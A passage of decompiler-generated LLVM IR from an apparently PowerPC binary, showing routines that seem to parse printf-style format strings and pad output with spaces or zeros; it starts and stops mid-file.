dec_label_pc_10005b40:                            ; preds = %dec_label_pc_10005ad4
  br i1 %v3_10005b40, label %dec_label_pc_10005b48, label %dec_label_pc_10005ce8

dec_label_pc_10005b48:                            ; preds = %dec_label_pc_10005b40
  %v0_10005b48 = call i32 @function_10004b48()
  %v1_10005b50 = inttoptr i32 %v0_10005b48 to i32*
  %v2_10005b50 = load i32, i32* %v1_10005b50, align 4
  store i32 %v2_10005b50, i32* @r3, align 4
  store i32 128, i32* @r5, align 4
  store i32 268458844, i32* @lr, align 4
  %v3_10005b58 = call i32 @function_10007214(i32 %v2_10005b50, i32 %v2_10005b4c, i32 128)
  store i32 %v3_10005b58, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10005af4

dec_label_pc_10005b64:                            ; preds = %dec_label_pc_100059e8, %dec_label_pc_100059e0, %dec_label_pc_100059c8
  %v0_10005b88.pre41 = phi i32 [ %v1_10005948, %dec_label_pc_100059e8 ], [ 0, %dec_label_pc_100059e0 ], [ 5, %dec_label_pc_100059c8 ]
  store i32 0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10005b84thread-pre-split

dec_label_pc_10005b6c:                            ; preds = %dec_label_pc_10005ae8, %dec_label_pc_10005a48
  store i32 6, i32* %r31.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1000e05c.225 to i32), i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10005b78

dec_label_pc_10005b78:                            ; preds = %dec_label_pc_10005b08, %dec_label_pc_10005b6c
  %v0_10005b8829 = phi i32 [ %v2_10005b0c, %dec_label_pc_10005b08 ], [ 6, %dec_label_pc_10005b6c ]
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 11, i32* @r27, align 4
  store i32 32, i32* @r26, align 4
  br label %dec_label_pc_10005b84

dec_label_pc_10005b84thread-pre-split:            ; preds = %dec_label_pc_10005abc, %dec_label_pc_10005b18, %dec_label_pc_10005b64, %dec_label_pc_100059e8
  %v1_10005b88.pre = phi i32 [ %v2_100059ec, %dec_label_pc_100059e8 ], [ 0, %dec_label_pc_10005b64 ], [ %v1_10005b88.pre.pre, %dec_label_pc_10005abc ], [ 0, %dec_label_pc_10005b18 ]
  %v0_10005b88.pre = phi i32 [ %v1_10005948, %dec_label_pc_100059e8 ], [ %v0_10005b88.pre41, %dec_label_pc_10005b64 ], [ %v0_10005b88.pre.pre, %dec_label_pc_10005abc ], [ 1, %dec_label_pc_10005b18 ]
  %stack_var_-184.1.ph = phi i32 [ %stack_var_-184.0, %dec_label_pc_100059e8 ], [ %stack_var_-184.0, %dec_label_pc_10005b64 ], [ %v0_1000592c, %dec_label_pc_10005abc ], [ %v0_1000592c, %dec_label_pc_10005b18 ]
  %v0_10005b84.pr = load i32, i32* @r27, align 4
  br label %dec_label_pc_10005b84

dec_label_pc_10005b84:                            ; preds = %dec_label_pc_10005b84thread-pre-split, %dec_label_pc_10005a88, %dec_label_pc_10005b78
  %v1_10005b88 = phi i32 [ %v1_10005b88.pre, %dec_label_pc_10005b84thread-pre-split ], [ 0, %dec_label_pc_10005a88 ], [ 0, %dec_label_pc_10005b78 ]
  %v0_10005b88 = phi i32 [ %v0_10005b88.pre, %dec_label_pc_10005b84thread-pre-split ], [ %v0_10005a78, %dec_label_pc_10005a88 ], [ %v0_10005b8829, %dec_label_pc_10005b78 ]
  %v0_10005b90 = phi i32 [ %v0_10005b84.pr, %dec_label_pc_10005b84thread-pre-split ], [ 11, %dec_label_pc_10005a88 ], [ 11, %dec_label_pc_10005b78 ]
  %stack_var_-184.1 = phi i32 [ %stack_var_-184.1.ph, %dec_label_pc_10005b84thread-pre-split ], [ %v0_1000592c, %dec_label_pc_10005a88 ], [ %v0_1000592c, %dec_label_pc_10005b78 ]
  %v3_10005b84 = icmp eq i32 %v0_10005b90, 11
  %v2_10005b88 = add i32 %v0_10005b88, %v1_10005b88
  store i32 %v2_10005b88, i32* %r0.global-to-local, align 4
  br i1 %v3_10005b84, label %dec_label_pc_10005ba4, label %dec_label_pc_10005b90

dec_label_pc_10005b90:                            ; preds = %dec_label_pc_10005b84
  %v0_10005b94 = call i32 @__asm_mfcr()
  %v1_10005b98 = call i32 @__asm_rlwinm(i32 %v0_10005b94, i32 30, i32 31, i32 31)
  %v1_10005b9c = add i32 %v1_10005b98, 1
  %v0_10005ba0 = load i32, i32* %r0.global-to-local, align 4
  %v2_10005ba0 = add i32 %v0_10005ba0, %v1_10005b9c
  store i32 %v2_10005ba0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10005ba4

dec_label_pc_10005ba4:                            ; preds = %dec_label_pc_10005b84, %dec_label_pc_10005b90
  %v0_10005bbc = phi i32 [ %v2_10005b88, %dec_label_pc_10005b84 ], [ %v2_10005ba0, %dec_label_pc_10005b90 ]
  %v3_10005bac = icmp ugt i32 %tmp, %v0_10005bbc
  br i1 %v3_10005bac, label %dec_label_pc_10005bb4, label %dec_label_pc_10005bb8

dec_label_pc_10005bb4:                            ; preds = %dec_label_pc_10005ba4
  %v2_10005bb4 = sub i32 %tmp, %v0_10005bbc
  br label %dec_label_pc_10005bb8

dec_label_pc_10005bb8:                            ; preds = %dec_label_pc_10005ba4, %dec_label_pc_10005bb4
  %storemerge93 = phi i32 [ %v2_10005bb4, %dec_label_pc_10005bb4 ], [ 0, %dec_label_pc_10005ba4 ]
  %v1_10005bc8 = phi i32 [ %v2_10005bb4, %dec_label_pc_10005bb4 ], [ 0, %dec_label_pc_10005ba4 ]
  store i32 %storemerge93, i32* @r28, align 4
  %v0_10005bb8 = load i32, i32* @r26, align 4
  %v3_10005bb8 = icmp eq i32 %v0_10005bb8, 48
  %v2_10005bbc = add i32 %v1_10005bc8, %v0_10005bbc
  store i32 %v2_10005bbc, i32* %r0.global-to-local, align 4
  %v0_10005bc0 = load i32, i32* %r23.global-to-local, align 4
  %v2_10005bc0 = add i32 %v0_10005bc0, %v2_10005bbc
  store i32 %v2_10005bc0, i32* %r23.global-to-local, align 4
  br i1 %v3_10005bb8, label %dec_label_pc_10005bc8, label %dec_label_pc_10005bd0

dec_label_pc_10005bc8:                            ; preds = %dec_label_pc_10005bb8
  %v0_10005bc8 = load i32, i32* %r29.global-to-local, align 4
  %v2_10005bc8 = add i32 %v0_10005bc8, %v1_10005bc8
  store i32 %v2_10005bc8, i32* %r29.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10005bd0

dec_label_pc_10005bd0:                            ; preds = %dec_label_pc_10005bb8, %dec_label_pc_10005bc8
  %v0_10005be4 = phi i32 [ %v1_10005bc8, %dec_label_pc_10005bb8 ], [ 0, %dec_label_pc_10005bc8 ]
  store i32 %stack_var_-184.1, i32* %r0.global-to-local, align 4
  %v1_10005bd4 = and i32 %stack_var_-184.1, 8
  %v3_10005bd4 = icmp eq i32 %v1_10005bd4, 0
  br i1 %v3_10005bd4, label %dec_label_pc_10005bdc, label %dec_label_pc_10005bf8

dec_label_pc_10005bdc:                            ; preds = %dec_label_pc_10005bd0
  %v0_10005bdc = load i32, i32* %r24.global-to-local, align 4
  store i32 268458988, i32* @lr, align 4
  %v4_10005be8 = call i32 @function_10005594(i32 %v0_10005bdc, i8 32, i32 %v0_10005be4)
  %v1_10005bec = load i32, i32* @r28, align 4
  %v4_10005bec = icmp eq i32 %v4_10005be8, %v1_10005bec
  br i1 %v4_10005bec, label %dec_label_pc_10005bf4, label %dec_label_pc_10005ce8

dec_label_pc_10005bf4:                            ; preds = %dec_label_pc_10005bdc
  br label %dec_label_pc_10005bf8

dec_label_pc_10005bf8:                            ; preds = %dec_label_pc_10005bd0, %dec_label_pc_10005bf4
  %v0_10005bfc = load i32, i32* %r24.global-to-local, align 4
  %v0_10005c04 = load i32, i32* @r27, align 4
  %v2_10005c04 = add i32 %v0_10005c04, ptrtoint (i32* @global_var_1000e064.226 to i32)
  store i32 268459020, i32* @lr, align 4
  %v2_10005c08 = call i32 @function_10006c78(i32 %v2_10005c04, i32 %v0_10005bfc)
  %v0_10005c14 = load i32, i32* @r29, align 4
  store i32 268459036, i32* @lr, align 4
  %v4_10005c18 = call i32 @function_10005594(i32 %v0_10005bfc, i8 48, i32 %v0_10005c14)
  %v1_10005c1c = load i32, i32* @r29, align 4
  %v4_10005c1c = icmp eq i32 %v4_10005c18, %v1_10005c1c
  br i1 %v4_10005c1c, label %dec_label_pc_10005c24, label %dec_label_pc_10005ce8

dec_label_pc_10005c24:                            ; preds = %dec_label_pc_10005bf8
  %v3_10005c24 = load i32, i32* %stack_var_-340, align 4
  store i32 %v3_10005c24, i32* %r0.global-to-local, align 4
  %v3_10005c28 = icmp eq i32 %v3_10005c24, 0
  br i1 %v3_10005c28, label %dec_label_pc_10005c30, label %dec_label_pc_10005c58

dec_label_pc_10005c30:                            ; preds = %dec_label_pc_10005c24
  %v0_10005c30 = load i32, i32* @r31, align 4
  %v3_10005c30 = icmp eq i32 %v0_10005c30, 0
  br i1 %v3_10005c30, label %dec_label_pc_10005c4c.thread, label %dec_label_pc_10005c4c

dec_label_pc_10005c4c.thread:                     ; preds = %dec_label_pc_10005c30
  br label %dec_label_pc_10005cbc

dec_label_pc_10005c4c:                            ; preds = %dec_label_pc_10005c30
  %v0_10005c3c = load i32, i32* @r30, align 4
  %v0_10005c44 = load i32, i32* %r24.global-to-local, align 4
  store i32 268459084, i32* @lr, align 4
  %v4_10005c48 = inttoptr i32 %v0_10005c44 to i16*
  %v5_10005c48 = call i32 @function_100097d0(i32 %v0_10005c3c, i32 %v0_10005c30, i16* %v4_10005c48)
  %v1_10005c4c.pre = load i32, i32* @r31, align 4
  %v4_10005c4c = icmp eq i32 %v5_10005c48, %v1_10005c4c.pre
  br i1 %v4_10005c4c, label %dec_label_pc_10005cbc, label %dec_label_pc_10005ce8

dec_label_pc_10005c58:                            ; preds = %dec_label_pc_10005c24
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-336, align 4
  %v0_10005c9c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10005c9c

dec_label_pc_10005c64:                            ; preds = %dec_label_pc_10005c9c
  %tmp78 = icmp ult i32 %v0_10005cb4, 129
  br i1 %tmp78, label %dec_label_pc_10005c6c, label %dec_label_pc_10005c68

dec_label_pc_10005c68:                            ; preds = %dec_label_pc_10005c64
  store i32 128, i32* @r5, align 4
  br label %dec_label_pc_10005c6c

dec_label_pc_10005c6c:                            ; preds = %dec_label_pc_10005c64, %dec_label_pc_10005c68
  store i32 ptrtoint (i32* @global_var_10005c70.227 to i32), i32* @lr, align 4
  %v0_10005c6c = call i32 @function_100095b0()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_10005c6c, i32* @r30, align 4
  %v3_10005c74 = icmp eq i32 %v0_10005c6c, 0
  br i1 %v3_10005c74, label %dec_label_pc_10005c90, label %dec_label_pc_10005c88

dec_label_pc_10005c88:                            ; preds = %dec_label_pc_10005c6c
  %v0_10005c78 = load i32, i32* %r24.global-to-local, align 4
  store i32 268459148, i32* @lr, align 4
  %v3_10005c88 = inttoptr i32 %v0_10005c78 to i16*
  %v4_10005c88 = call i32 @function_100097d0(i32 %v2_10005b4c, i32 %v0_10005c6c, i16* %v3_10005c88)
  store i32 %v4_10005c88, i32* %r0.global-to-local, align 4
  %v1_10005c90.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10005c90

dec_label_pc_10005c90:                            ; preds = %dec_label_pc_10005c6c, %dec_label_pc_10005c88
  %v1_10005c90 = phi i32 [ 0, %dec_label_pc_10005c6c ], [ %v1_10005c90.pre, %dec_label_pc_10005c88 ]
  %v0_10005c94 = phi i32 [ 0, %dec_label_pc_10005c6c ], [ %v4_10005c88, %dec_label_pc_10005c88 ]
  %v4_10005c90 = icmp eq i32 %v0_10005c94, %v1_10005c90
  %v1_10005c94 = load i32, i32* @r31, align 4
  %v2_10005c94 = sub i32 %v1_10005c94, %v0_10005c94
  store i32 %v2_10005c94, i32* @r31, align 4
  br i1 %v4_10005c90, label %dec_label_pc_10005c9c, label %dec_label_pc_10005ce8

dec_label_pc_10005c9c:                            ; preds = %dec_label_pc_10005c90, %dec_label_pc_10005c58
  %v0_10005cb4 = phi i32 [ %v2_10005c94, %dec_label_pc_10005c90 ], [ %v0_10005c9c.pre, %dec_label_pc_10005c58 ]
  %v3_10005c9c = icmp eq i32 %v0_10005cb4, 0
  store i32 %v2_10005b4c, i32* @r29, align 4
  store i32 %v2_10005a6c, i32* @r4, align 4
  store i32 %v2_10005a70, i32* @r6, align 4
  store i32 %v2_10005b4c, i32* @r3, align 4
  store i32 %v0_10005cb4, i32* @r5, align 4
  br i1 %v3_10005c9c, label %dec_label_pc_10005cbc, label %dec_label_pc_10005c64

dec_label_pc_10005cbc:                            ; preds = %dec_label_pc_10005c9c, %dec_label_pc_10005c4c.thread, %dec_label_pc_10005c4c
  %v0_10005cbc = load i32, i32* %r24.global-to-local, align 4
  %v0_10005cc4 = load i32, i32* @r28, align 4
  store i32 268459212, i32* @lr, align 4
  %v4_10005cc8 = call i32 @function_10005594(i32 %v0_10005cbc, i8 32, i32 %v0_10005cc4)
  %v1_10005ccc = load i32, i32* @r28, align 4
  %v4_10005ccc = icmp eq i32 %v4_10005cc8, %v1_10005ccc
  br i1 %v4_10005ccc, label %dec_label_pc_10005cd4, label %dec_label_pc_10005ce8

dec_label_pc_10005cd4:                            ; preds = %dec_label_pc_10005cbc, %dec_label_pc_10005a24, %dec_label_pc_100057f8
  %stack_var_-184.2 = phi i32 [ %v0_1000592c, %dec_label_pc_100057f8 ], [ %stack_var_-184.1, %dec_label_pc_10005cbc ], [ %v0_1000592c, %dec_label_pc_10005a24 ]
  %v3_10005cd4 = load i8*, i8** %stack_var_-200, align 4
  %v4_10005cd4 = ptrtoint i8* %v3_10005cd4 to i32
  store i32 %v4_10005cd4, i32* @r29, align 4
  br label %dec_label_pc_10005cd8

dec_label_pc_10005cd8:                            ; preds = %dec_label_pc_100056ec, %dec_label_pc_10005cd4
  %v0_10005cd8 = phi i32 [ %v0_10005cd8.pre, %dec_label_pc_100056ec ], [ %v4_10005cd4, %dec_label_pc_10005cd4 ]
  %v0_1000592c = phi i32 [ %tmp56, %dec_label_pc_100056ec ], [ %stack_var_-184.2, %dec_label_pc_10005cd4 ]
  br label %dec_label_pc_10005704

dec_label_pc_10005ce8:                            ; preds = %dec_label_pc_10005b40, %dec_label_pc_10005cbc, %dec_label_pc_10005c4c, %dec_label_pc_10005bf8, %dec_label_pc_10005bdc, %dec_label_pc_10005a9c, %dec_label_pc_10005a6c, %dec_label_pc_10005a00, %dec_label_pc_10005740, %dec_label_pc_10005c90
  store i32 -1, i32* %r23.global-to-local, align 4
  br label %dec_label_pc_10005cec

dec_label_pc_10005cec:                            ; preds = %dec_label_pc_1000574c, %dec_label_pc_100056c4, %dec_label_pc_100056dc, %dec_label_pc_10005ce8
  store i32 %v0_10005698, i32* %r0.global-to-local, align 4
  %v0_10005cf0 = load i32, i32* %r23.global-to-local, align 4
  ret i32 %v0_10005cf0

; uselistorder directives
  uselistorder i32 %v0_1000592c, { 16, 11, 12, 13, 1, 2, 0, 10, 9, 8, 7, 6, 4, 5, 3, 15, 14 }
  uselistorder i32 %v0_10005cb4, { 1, 2, 0 }
  uselistorder i32 %v1_10005bc8, { 2, 0, 1 }
  uselistorder i32 %stack_var_-184.1, { 0, 2, 1 }
  uselistorder i32 %v3_10005b58, { 1, 0 }
  uselistorder i32 %v2_10005ae8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10005a48, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-184.0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_1000592c, { 1, 0 }
  uselistorder i32 %v6_100058e4, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v0_100058c8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_100058b4, { 1, 0 }
  uselistorder i32 %v1_10005858, { 1, 0 }
  uselistorder i1 %v2_1000584c, { 1, 0 }
  uselistorder i32 %v0_100057fc, { 1, 0, 2 }
  uselistorder i32 %v1_100057e8, { 1, 0 }
  uselistorder i32 %v0_100057e0, { 1, 0 }
  uselistorder i32 %v1_100057dc, { 1, 0 }
  uselistorder i32 %v1_10005758, { 0, 3, 2, 1 }
  uselistorder i32 %v1_10005720, { 1, 2, 3, 0 }
  uselistorder i32 %v0_10005730, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_10005b4c, { 3, 2, 4, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 %v2_10005794, { 1, 2, 0 }
  uselistorder i32 %v4_1000578c, { 1, 0 }
  uselistorder i8** %stack_var_-200, { 4, 3, 2, 0, 1 }
  uselistorder i32* %stack_var_-344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %stack_var_-196, { 1, 2, 0, 3, 4 }
  uselistorder i32 %tmp57, { 16, 14, 12, 10, 6, 7, 8, 0, 2, 1, 4, 3, 5, 9, 15, 17, 13, 11 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 2, 3, 4, 5, 9, 6, 7, 8, 10, 11 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13 }
  uselistorder i32* %r29.global-to-local, { 0, 7, 1, 2, 3, 4, 5, 6, 8 }
  uselistorder i32* %r24.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %r23.global-to-local, { 9, 0, 1, 4, 2, 5, 6, 3, 7, 8, 10 }
  uselistorder i32* %r11.global-to-local, { 2, 3, 4, 5, 7, 6, 0, 1 }
  uselistorder i32* %r10.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 30, 31, 0, 1, 32, 33, 34, 35, 36, 37 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 0, 1, 2, 5 }
  uselistorder i32 (i32, i8, i32)* @function_10005594, { 1, 2, 3, 0 }
  uselistorder i8 32, { 1, 0, 2, 3, 6, 5, 7, 4 }
  uselistorder i32 ()* @function_100095b0, { 1, 0 }
  uselistorder label %dec_label_pc_10005cec, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10005ce8, { 1, 9, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder label %dec_label_pc_10005cd8, { 1, 0 }
  uselistorder label %dec_label_pc_10005cbc, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10005c90, { 1, 0 }
  uselistorder label %dec_label_pc_10005c6c, { 1, 0 }
  uselistorder label %dec_label_pc_10005bf8, { 1, 0 }
  uselistorder label %dec_label_pc_10005bd0, { 1, 0 }
  uselistorder label %dec_label_pc_10005bb8, { 1, 0 }
  uselistorder label %dec_label_pc_10005ba4, { 1, 0 }
  uselistorder label %dec_label_pc_10005b84, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10005b84thread-pre-split, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10005b78, { 1, 0 }
  uselistorder label %dec_label_pc_10005b08, { 1, 0 }
  uselistorder label %dec_label_pc_10005af4, { 1, 0 }
  uselistorder label %dec_label_pc_10005a6c, { 1, 0 }
  uselistorder label %dec_label_pc_100059bc, { 1, 0 }
  uselistorder label %dec_label_pc_100059a4, { 6, 2, 3, 1, 5, 0, 4 }
  uselistorder label %dec_label_pc_10005954, { 1, 0 }
  uselistorder label %dec_label_pc_10005938, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_100058c4, { 1, 0 }
  uselistorder label %dec_label_pc_100058a8, { 1, 0 }
  uselistorder label %dec_label_pc_10005894, { 1, 0 }
  uselistorder label %dec_label_pc_10005890, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005864, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100057ec, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_100057d8.dec_label_pc_100057d8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_100057b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000574c, { 1, 0 }
  uselistorder label %dec_label_pc_10005740, { 1, 0 }
  uselistorder label %dec_label_pc_10005704, { 1, 0 }
}

define i32 @function_10005d04(i32* %arg1) local_unnamed_addr {
dec_label_pc_10005d04:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v0_10005d08 = load i32, i32* @lr, align 4
  store i32 %v0_10005d08, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_10005d18 = load i32, i32* @r4, align 4
  store i32 %v0_10005d18, i32* @r30, align 4
  store i32 268459304, i32* @lr, align 4
  %v3_10005d24 = call i32 @function_10006e28(i32 0, i32 160, i32 160)
  %v0_10005d28 = load i32, i32* @r31, align 4
  %v1_10005d28 = add i32 %v0_10005d28, 24
  %v2_10005d28 = inttoptr i32 %v1_10005d28 to i32*
  %v3_10005d28 = load i32, i32* %v2_10005d28, align 4
  store i32 %v3_10005d28, i32* %r9.global-to-local, align 4
  store i32 9, i32* %r11.global-to-local, align 4
  %v0_10005d30 = load i32, i32* @r30, align 4
  %v2_10005d30 = inttoptr i32 %v0_10005d28 to i32*
  store i32 %v0_10005d30, i32* %v2_10005d30, align 4
  %v0_10005d34 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10005d34, i32* %ctr.global-to-local, align 4
  %v0_10005d38 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005d38 = add i32 %v0_10005d38, -1
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_10005d40 = load i32, i32* @r31, align 4
  %v2_10005d40 = add i32 %v1_10005d40, 24
  %v3_10005d40 = inttoptr i32 %v2_10005d40 to i32*
  store i32 %v1_10005d38, i32* %v3_10005d40, align 4
  %v0_10005d44 = load i32, i32* @r31, align 4
  %v1_10005d44 = add i32 %v0_10005d44, 40
  store i32 %v1_10005d44, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10005d48

dec_label_pc_10005d48:                            ; preds = %dec_label_pc_10005d48, %dec_label_pc_10005d04
  %v1_10005d48 = phi i32 [ %v1_10005d4c, %dec_label_pc_10005d48 ], [ %v1_10005d44, %dec_label_pc_10005d04 ]
  %v0_10005d48 = load i32, i32* %r0.global-to-local, align 4
  %v2_10005d48 = inttoptr i32 %v1_10005d48 to i32*
  store i32 %v0_10005d48, i32* %v2_10005d48, align 4
  %v0_10005d4c = load i32, i32* %r9.global-to-local, align 4
  %v1_10005d4c = add i32 %v0_10005d4c, 4
  store i32 %v1_10005d4c, i32* %r9.global-to-local, align 4
  %v0_10005d50 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10005d50 = add i32 %v0_10005d50, -1
  store i32 %v1_10005d50, i32* %ctr.global-to-local, align 4
  %v2_10005d50 = icmp eq i32 %v1_10005d50, 0
  br i1 %v2_10005d50, label %dec_label_pc_10005d54, label %dec_label_pc_10005d48

dec_label_pc_10005d54:                            ; preds = %dec_label_pc_10005d48
  %v0_10005d54 = load i32, i32* @r30, align 4
  br label %dec_label_pc_10005d94

dec_label_pc_10005d64:                            ; preds = %dec_label_pc_10005d94
  %v3_10005d9c = icmp eq i8 %v2_10005d94, 37
  br i1 %v3_10005d9c, label %dec_label_pc_10005d68, label %dec_label_pc_10005d90

dec_label_pc_10005d68:                            ; preds = %dec_label_pc_10005d64
  %v1_10005d68 = add i32 %v0_10005d68, 1
  %v2_10005d68 = inttoptr i32 %v1_10005d68 to i8*
  %v3_10005d68 = load i8, i8* %v2_10005d68, align 1
  %v4_10005d68 = zext i8 %v3_10005d68 to i32
  store i32 %v4_10005d68, i32* %r0.global-to-local, align 4
  store i32 %v1_10005d68, i32* %r9.global-to-local, align 4
  %v3_10005d70 = icmp eq i8 %v3_10005d68, 37
  br i1 %v3_10005d70, label %dec_label_pc_10005d90, label %dec_label_pc_10005d78

dec_label_pc_10005d78:                            ; preds = %dec_label_pc_10005d68
  %v0_10005d6c = load i32, i32* @r31, align 4
  %v2_10005d78 = inttoptr i32 %v0_10005d6c to i32*
  store i32 %v1_10005d68, i32* %v2_10005d78, align 4
  store i32 268459392, i32* @lr, align 4
  %v1_10005d7c = load i32, i32* %r9.global-to-local, align 4
  %v3_10005d7c = call i32 @function_100060cc(i32* %v2_10005d78, i32 %v1_10005d7c)
  %v1_10005d80 = icmp slt i32 %v3_10005d7c, 0
  br i1 %v1_10005d80, label %dec_label_pc_10005dac, label %dec_label_pc_10005d88

dec_label_pc_10005d88:                            ; preds = %dec_label_pc_10005d78
  %v0_10005d88 = load i32, i32* @r31, align 4
  %v1_10005d88 = inttoptr i32 %v0_10005d88 to i32*
  %v2_10005d88 = load i32, i32* %v1_10005d88, align 4
  br label %dec_label_pc_10005d94

dec_label_pc_10005d90:                            ; preds = %dec_label_pc_10005d64, %dec_label_pc_10005d68
  %v0_10005d90 = phi i32 [ %v0_10005d68, %dec_label_pc_10005d64 ], [ %v1_10005d68, %dec_label_pc_10005d68 ]
  %v1_10005d90 = add i32 %v0_10005d90, 1
  br label %dec_label_pc_10005d94

dec_label_pc_10005d94:                            ; preds = %dec_label_pc_10005d88, %dec_label_pc_10005d90, %dec_label_pc_10005d54
  %v0_10005d68 = phi i32 [ %v0_10005d54, %dec_label_pc_10005d54 ], [ %v1_10005d90, %dec_label_pc_10005d90 ], [ %v2_10005d88, %dec_label_pc_10005d88 ]
  store i32 %v0_10005d68, i32* %r9.global-to-local, align 4
  %v1_10005d94 = inttoptr i32 %v0_10005d68 to i8*
  %v2_10005d94 = load i8, i8* %v1_10005d94, align 1
  %v3_10005d94 = zext i8 %v2_10005d94 to i32
  store i32 %v3_10005d94, i32* %r0.global-to-local, align 4
  %v3_10005d98 = icmp eq i8 %v2_10005d94, 0
  br i1 %v3_10005d98, label %dec_label_pc_10005da4, label %dec_label_pc_10005d64

dec_label_pc_10005da4:                            ; preds = %dec_label_pc_10005d94
  %v0_10005da4 = load i32, i32* @r30, align 4
  %v1_10005da4 = load i32, i32* @r31, align 4
  %v2_10005da4 = inttoptr i32 %v1_10005da4 to i32*
  store i32 %v0_10005da4, i32* %v2_10005da4, align 4
  br label %dec_label_pc_10005dac

dec_label_pc_10005dac:                            ; preds = %dec_label_pc_10005d78, %dec_label_pc_10005da4
  %storemerge = phi i32 [ 0, %dec_label_pc_10005da4 ], [ -1, %dec_label_pc_10005d78 ]
  store i32 %v0_10005d08, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_10005d94, { 1, 2, 0 }
  uselistorder i32 %v0_10005d68, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10005d50, { 1, 0 }
  uselistorder i32 %v1_10005d4c, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_10005dac, { 1, 0 }
  uselistorder label %dec_label_pc_10005d94, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10005d90, { 1, 0 }
}

define i32 @function_10005dc0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10005dc0:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_10005dc0 = load i32, i32* @lr, align 4
  %v0_10005dc8 = load i32, i32* @r3, align 4
  store i32 %v0_10005dc8, i32* @r31, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10005de4 = add i32 %v0_10005dc8, 24
  %v2_10005de4 = inttoptr i32 %v1_10005de4 to i32*
  %v3_10005de4 = load i32, i32* %v2_10005de4, align 4
  store i32 %v3_10005de4, i32* @r30, align 4
  %tmp4 = icmp slt i32 %v3_10005de4, 1
  br i1 %tmp4, label %dec_label_pc_10005e08, label %dec_label_pc_10005df0

dec_label_pc_10005df0:                            ; preds = %dec_label_pc_10005dc0
  %v2_10005df0 = add i32 %v0_10005dc8, 8
  %v3_10005df0 = inttoptr i32 %v2_10005df0 to i32*
  store i32 0, i32* %v3_10005df0, align 4
  %v0_10005df4 = load i32, i32* @r30, align 4
  %v1_10005df4 = load i32, i32* @r3, align 4
  %v2_10005df4 = add i32 %v1_10005df4, 28
  %v3_10005df4 = inttoptr i32 %v2_10005df4 to i32*
  store i32 %v0_10005df4, i32* %v3_10005df4, align 4
  %v0_10005df8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10005df8 = load i32, i32* @r3, align 4
  %v2_10005df8 = add i32 %v1_10005df8, 24
  %v3_10005df8 = inttoptr i32 %v2_10005df8 to i32*
  store i32 %v0_10005df8, i32* %v3_10005df8, align 4
  %v0_10005dfc = load i32, i32* %r0.global-to-local, align 4
  %v1_10005dfc = load i32, i32* @r3, align 4
  %v2_10005dfc = add i32 %v1_10005dfc, 4
  %v3_10005dfc = inttoptr i32 %v2_10005dfc to i32*
  store i32 %v0_10005dfc, i32* %v3_10005dfc, align 4
  store i32 268459524, i32* @lr, align 4
  %v0_10005e00 = call i32 @function_10005e1c()
  store i32 %v0_10005e00, i32* %r3.global-to-local, align 4
  %v0_10005e04 = load i32, i32* @r30, align 4
  %v1_10005e04 = load i32, i32* @r31, align 4
  %v2_10005e04 = add i32 %v1_10005e04, 24
  %v3_10005e04 = inttoptr i32 %v2_10005e04 to i32*
  store i32 %v0_10005e04, i32* %v3_10005e04, align 4
  %v0_10005e18.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10005e08

